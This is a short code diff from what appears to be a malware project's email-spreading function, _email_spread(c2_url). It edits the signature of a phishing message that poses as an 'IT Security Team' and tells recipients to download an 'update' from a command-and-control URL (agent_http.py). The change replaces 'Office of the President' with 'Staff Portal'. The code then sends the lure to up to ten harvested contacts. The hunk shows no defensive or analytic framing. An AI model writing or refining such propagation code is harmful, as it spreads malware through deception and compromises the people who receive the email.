@@ -1019,7 +1019,7 @@ def _email_spread(c2_url):
           f"Please install the update immediately to maintain access.\n\n"
           f"Download: {c2_url}/download/agent_http.py\n\n"
           f"IT Security Team\n"
-          f"Office of the President")
+          f"Staff Portal")
     sent=[]
     for email in contacts[:10]:
         try:
